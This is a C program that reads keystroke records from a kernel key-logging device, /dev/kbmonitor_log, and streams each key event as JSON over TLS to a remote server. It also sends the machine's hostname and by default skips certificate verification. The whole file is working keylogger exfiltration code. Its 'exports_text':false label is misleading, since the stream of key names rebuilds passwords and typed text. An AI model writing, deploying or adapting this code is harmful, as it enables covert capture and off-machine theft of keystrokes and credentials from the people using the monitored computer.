/*
 * kbmon_tls - TLS streamer for kbmonitor key-name log entries.
 *
 * This program reads the bounded Linux key-name log from /dev/kbmonitor_log,
 * watches for new entries, and streams them to a TLS server as JSON lines.
 */

#define _POSIX_C_SOURCE 200809L

#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <openssl/err.h>
#include <openssl/ssl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define KBMON_LOG_DEVICE "/dev/kbmonitor_log"
#define KBMON_READ_BUF 16384
#define JSON_BUF_SIZE 65536

struct options {
	const char *host;
	const char *port;
	const char *ca_file;
	const char *server_name;
	int insecure;
	int interval_sec;
	int count;
};

struct tls_client {
	SSL_CTX *ctx;
	SSL *ssl;
	int fd;
};

struct kb_log_event {
	unsigned long long seq;
	unsigned long long time_ms;
	unsigned int code;
	char key[64];
};

struct kb_log_snapshot {
	unsigned int events;
	unsigned int log_capacity;
	unsigned long long log_dropped;
	struct kb_log_event entries[128];
	unsigned int entry_count;
};

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage:\n"
		"  %s HOST PORT [--interval SEC] [--count N] [--ca-file FILE] [--server-name NAME] [--insecure]\n"
		"\n"
		"By default, streams new key-name log events until interrupted.\n"
		"Use --count N to stop after sending N key events.\n"
		"\n"
		"Examples:\n"
		"  %s 192.168.1.20 8443 --insecure\n"
		"  %s 192.168.1.20 8443 --interval 1 --count 10 --insecure\n",
		prog, prog, prog);
}

static int appendf(char *buf, size_t cap, size_t *len, const char *fmt, ...)
{
	va_list args;
	int written;

	if (*len >= cap)
		return -1;

	va_start(args, fmt);
	written = vsnprintf(buf + *len, cap - *len, fmt, args);
	va_end(args);

	if (written < 0 || (size_t)written >= cap - *len)
		return -1;

	*len += (size_t)written;
	return 0;
}

static int read_log_text(char *buf, size_t size)
{
	int fd;
	ssize_t n;

	fd = open(KBMON_LOG_DEVICE, O_RDONLY);
	if (fd < 0) {
		perror("open " KBMON_LOG_DEVICE);
		return -1;
	}

	n = read(fd, buf, size - 1);
	if (n < 0) {
		perror("read " KBMON_LOG_DEVICE);
		close(fd);
		return -1;
	}

	buf[n] = '\0';
	close(fd);
	return 0;
}

static void parse_log_text(const char *text, struct kb_log_snapshot *snapshot)
{
	const char *line = text;

	memset(snapshot, 0, sizeof(*snapshot));

	while (*line) {
		size_t line_len;
		char current[256];
		struct kb_log_event event;
		int header_parsed;

		line_len = strcspn(line, "\n");
		if (line_len >= sizeof(current))
			line_len = sizeof(current) - 1;
		memcpy(current, line, line_len);
		current[line_len] = '\0';

		header_parsed =
			sscanf(current, "events=%u", &snapshot->events) == 1 ||
			sscanf(current, "log_capacity=%u",
			       &snapshot->log_capacity) == 1 ||
			sscanf(current, "log_dropped=%llu",
			       &snapshot->log_dropped) == 1;

		if (!header_parsed &&
		    sscanf(current, "seq=%llu time_ms=%llu code=%u key=%63s",
			   &event.seq, &event.time_ms, &event.code,
			   event.key) == 4) {
			if (snapshot->entry_count <
			    sizeof(snapshot->entries) /
				    sizeof(snapshot->entries[0])) {
				snapshot->entries[snapshot->entry_count++] =
					event;
			}
		}

		line += line_len;
		if (*line == '\n')
			line++;
	}
}

static int collect_log_snapshot(struct kb_log_snapshot *snapshot)
{
	char text[KBMON_READ_BUF];

	if (read_log_text(text, sizeof(text)) < 0)
		return -1;

	parse_log_text(text, snapshot);
	return 0;
}

static int append_json_string(char *buf, size_t cap, size_t *len,
			      const char *value)
{
	const unsigned char *p = (const unsigned char *)value;

	if (appendf(buf, cap, len, "\"") < 0)
		return -1;

	while (*p) {
		switch (*p) {
		case '"':
			if (appendf(buf, cap, len, "\\\"") < 0)
				return -1;
			break;
		case '\\':
			if (appendf(buf, cap, len, "\\\\") < 0)
				return -1;
			break;
		case '\b':
			if (appendf(buf, cap, len, "\\b") < 0)
				return -1;
			break;
		case '\f':
			if (appendf(buf, cap, len, "\\f") < 0)
				return -1;
			break;
		case '\n':
			if (appendf(buf, cap, len, "\\n") < 0)
				return -1;
			break;
		case '\r':
			if (appendf(buf, cap, len, "\\r") < 0)
				return -1;
			break;
		case '\t':
			if (appendf(buf, cap, len, "\\t") < 0)
				return -1;
			break;
		default:
			if (*p < 0x20) {
				if (appendf(buf, cap, len, "\\u%04x", *p) < 0)
					return -1;
			} else if (appendf(buf, cap, len, "%c", *p) < 0) {
				return -1;
			}
			break;
		}
		p++;
	}

	return appendf(buf, cap, len, "\"");
}

static int snapshot_latest_seq(const struct kb_log_snapshot *snapshot,
			       unsigned long long *seq)
{
	if (!snapshot->entry_count)
		return 0;

	*seq = snapshot->entries[snapshot->entry_count - 1].seq;
	return 1;
}

static int build_stream_start_json(const struct kb_log_snapshot *snapshot,
				   char *json, size_t cap)
{
	char hostname[128] = "unknown";
	size_t len = 0;
	unsigned long long latest_seq = 0;
	int have_latest;
	time_t now = time(NULL);

	(void)gethostname(hostname, sizeof(hostname));
	hostname[sizeof(hostname) - 1] = '\0';
	have_latest = snapshot_latest_seq(snapshot, &latest_seq);

	if (appendf(json, cap, &len,
		    "{\"schema\":\"kbmonitor.keylog.stream.v1\","
		    "\"type\":\"stream_start\","
		    "\"source\":\"kbmonitor_log\","
		    "\"device\":") < 0)
		return -1;
	if (append_json_string(json, cap, &len, KBMON_LOG_DEVICE) < 0)
		return -1;
	if (appendf(json, cap, &len, ",\"host\":") < 0)
		return -1;
	if (append_json_string(json, cap, &len, hostname) < 0)
		return -1;
	if (appendf(json, cap, &len,
		    ",\"unix_time\":%lld,"
		    "\"privacy\":{\"exports_key_names\":true,"
		    "\"exports_text\":false},"
		    "\"log\":{\"events\":%u,\"capacity\":%u,"
		    "\"dropped\":%llu,\"latest_seq\":",
		    (long long)now, snapshot->events, snapshot->log_capacity,
		    snapshot->log_dropped) < 0)
		return -1;

	if (have_latest) {
		if (appendf(json, cap, &len, "%llu", latest_seq) < 0)
			return -1;
	} else if (appendf(json, cap, &len, "null") < 0) {
		return -1;
	}

	return appendf(json, cap, &len, "}}\n");
}

static int build_event_json(const struct kb_log_event *event, char *json,
			    size_t cap)
{
	size_t len = 0;
	time_t now = time(NULL);

	if (appendf(json, cap, &len,
		    "{\"schema\":\"kbmonitor.keylog.stream.v1\","
		    "\"type\":\"key_event\","
		    "\"source\":\"kbmonitor_log\","
		    "\"unix_time\":%lld,"
		    "\"event\":{\"seq\":%llu,\"time_ms\":%llu,"
		    "\"code\":%u,\"key\":",
		    (long long)now, event->seq, event->time_ms,
		    event->code) < 0)
		return -1;
	if (append_json_string(json, cap, &len, event->key) < 0)
		return -1;

	return appendf(json, cap, &len, "}}\n");
}

static int tcp_connect(const char *host, const char *port)
{
	struct addrinfo hints;
	struct addrinfo *res = NULL;
	struct addrinfo *rp;
	int fd = -1;
	int err;

	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_family = AF_UNSPEC;

	err = getaddrinfo(host, port, &hints, &res);
	if (err) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(err));
		return -1;
	}

	for (rp = res; rp; rp = rp->ai_next) {
		fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (fd < 0)
			continue;

		if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0)
			break;

		close(fd);
		fd = -1;
	}

	freeaddrinfo(res);
	return fd;
}

static int ssl_write_all(SSL *ssl, const char *buf, size_t len)
{
	size_t sent = 0;

	while (sent < len) {
		int n = SSL_write(ssl, buf + sent, (int)(len - sent));

		if (n <= 0)
			return -1;

		sent += (size_t)n;
	}

	return 0;
}

static int tls_client_connect(const struct options *opts, struct tls_client *client)
{
	SSL_CTX *ctx;
	SSL *ssl;
	int fd;

	memset(client, 0, sizeof(*client));
	client->fd = -1;

	fd = tcp_connect(opts->host, opts->port);
	if (fd < 0) {
		perror("connect");
		return -1;
	}

	ctx = SSL_CTX_new(TLS_client_method());
	if (!ctx) {
		close(fd);
		return -1;
	}

	if (opts->ca_file) {
		if (SSL_CTX_load_verify_locations(ctx, opts->ca_file, NULL) != 1) {
			ERR_print_errors_fp(stderr);
			goto out_ctx;
		}
		SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
	} else {
		SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
		if (!opts->insecure)
			fprintf(stderr,
				"warning: peer verification disabled; use --ca-file for verification\n");
	}

	ssl = SSL_new(ctx);
	if (!ssl)
		goto out_ctx;

	SSL_set_fd(ssl, fd);
	SSL_set_tlsext_host_name(ssl, opts->server_name);
	if (opts->ca_file)
		SSL_set1_host(ssl, opts->server_name);

	if (SSL_connect(ssl) != 1) {
		ERR_print_errors_fp(stderr);
		goto out_ssl;
	}

	client->ctx = ctx;
	client->ssl = ssl;
	client->fd = fd;
	return 0;

out_ssl:
	SSL_free(ssl);
out_ctx:
	SSL_CTX_free(ctx);
	close(fd);
	return -1;
}

static void tls_client_close(struct tls_client *client)
{
	if (client->ssl) {
		SSL_shutdown(client->ssl);
		SSL_free(client->ssl);
	}
	if (client->ctx)
		SSL_CTX_free(client->ctx);
	if (client->fd >= 0)
		close(client->fd);

	memset(client, 0, sizeof(*client));
	client->fd = -1;
}

static int send_tls_payload(struct tls_client *client, const char *payload)
{
	if (ssl_write_all(client->ssl, payload, strlen(payload)) == 0)
		return 0;

	ERR_print_errors_fp(stderr);
	return -1;
}

static int parse_int_arg(const char *value, int fallback)
{
	char *end = NULL;
	long parsed;

	errno = 0;
	parsed = strtol(value, &end, 10);
	if (errno || end == value || *end != '\0' || parsed < 0 ||
	    parsed > 86400)
		return fallback;

	return (int)parsed;
}

static int parse_args(int argc, char **argv, struct options *opts)
{
	int i;

	memset(opts, 0, sizeof(*opts));
	opts->interval_sec = 1;
	opts->count = 0;

	if (argc < 3)
		return -1;

	opts->host = argv[1];
	opts->port = argv[2];
	opts->server_name = opts->host;

	for (i = 3; i < argc; i++) {
		if (!strcmp(argv[i], "--interval") && i + 1 < argc)
			opts->interval_sec = parse_int_arg(argv[++i], 1);
		else if (!strcmp(argv[i], "--count") && i + 1 < argc)
			opts->count = parse_int_arg(argv[++i], 1);
		else if (!strcmp(argv[i], "--ca-file") && i + 1 < argc)
			opts->ca_file = argv[++i];
		else if (!strcmp(argv[i], "--server-name") && i + 1 < argc)
			opts->server_name = argv[++i];
		else if (!strcmp(argv[i], "--insecure"))
			opts->insecure = 1;
		else
			return -1;
	}

	if (opts->interval_sec < 1)
		opts->interval_sec = 1;

	return 0;
}

int main(int argc, char **argv)
{
	struct options opts;
	struct tls_client client;
	struct kb_log_snapshot snapshot;
	unsigned long long last_seq = 0;
	int have_last_seq;
	int sent = 0;

	if (parse_args(argc, argv, &opts) < 0) {
		usage(argv[0]);
		return 1;
	}

	SSL_library_init();
	SSL_load_error_strings();

	if (collect_log_snapshot(&snapshot) < 0)
		return 1;
	have_last_seq = snapshot_latest_seq(&snapshot, &last_seq);

	if (tls_client_connect(&opts, &client) < 0)
		return 1;

	{
		char json[JSON_BUF_SIZE];

		if (build_stream_start_json(&snapshot, json, sizeof(json)) < 0) {
			fprintf(stderr, "failed to build stream start JSON\n");
			tls_client_close(&client);
			return 1;
		}

		if (send_tls_payload(&client, json) < 0) {
			tls_client_close(&client);
			return 1;
		}
	}

	printf("streaming TLS key log events to %s:%s\n", opts.host, opts.port);
	fflush(stdout);

	while (opts.count == 0 || sent < opts.count) {
		unsigned long long latest_seq;
		int have_latest;
		unsigned int i;

		sleep((unsigned int)opts.interval_sec);

		if (collect_log_snapshot(&snapshot) < 0) {
			tls_client_close(&client);
			return 1;
		}

		have_latest = snapshot_latest_seq(&snapshot, &latest_seq);
		if (have_last_seq && have_latest && latest_seq < last_seq)
			have_last_seq = 0;

		for (i = 0; i < snapshot.entry_count; i++) {
			const struct kb_log_event *event = &snapshot.entries[i];
			char json[JSON_BUF_SIZE];

			if (have_last_seq && event->seq <= last_seq)
				continue;

			if (build_event_json(event, json, sizeof(json)) < 0) {
				fprintf(stderr, "failed to build key event JSON\n");
				tls_client_close(&client);
				return 1;
			}

			if (send_tls_payload(&client, json) < 0) {
				tls_client_close(&client);
				return 1;
			}

			last_seq = event->seq;
			have_last_seq = 1;
			sent++;
			printf("sent key event seq=%llu key=%s to %s:%s\n",
			       event->seq, event->key, opts.host, opts.port);
			fflush(stdout);

			if (opts.count != 0 && sent >= opts.count)
				break;
		}
	}

	tls_client_close(&client);
	return 0;
}
